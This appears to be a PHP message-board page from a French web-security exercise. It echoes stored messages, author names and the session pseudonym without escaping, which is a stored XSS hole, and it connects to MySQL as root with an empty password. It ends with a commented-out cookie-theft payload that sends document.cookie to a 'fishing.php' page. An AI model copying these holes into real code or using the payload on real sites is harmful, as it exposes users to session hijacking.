<?php
session_start();
echo 'Bienvenue à toi '.$_SESSION['pseudo'];
?>

<form class="formArea" action="form.php" method="post">
    <!-- <label for="pseudo">Pseudo:</label> -->
    <!-- <input type="text" name="pseudo" width="200" /> -->
    <textarea name="message" rows="10" cols="60" />Ecrivez votre message</textarea>
    <input class="inputSubmit" type="submit" value="Envoyer">
</form>
<br>


<?php

//7- On récupère les informations dans la base de données
try {
    $pdo = new PDO(
        'mysql:host=localhost;dbname=security;port=3308',
        'root',
        '',
        array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8")
    );
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    /*Sélectionne toutes les valeurs dans la table users*/
    $sth = $pdo->prepare("SELECT * FROM message");
    $sth->execute();


    $resultat = $sth->fetchAll(PDO::FETCH_ASSOC);

?>
    <!-- Affichage du tableau des valeurs -->


    <?php
    foreach ($resultat as $key => $value) {
        if ($value['message'] != null) {
            echo "<strong>" . $value['author'] . ":</strong> " . $value['message'] . "<br>";
        }
    }
    ?>

<a href="logout.php">Déconnexion</a>

<?php
} catch (PDOException $e) {
    echo "Erreur : " . $e->getMessage();
}

?>

<script>//new Image().src="fishing.php?cookie="+document.cookie;</script>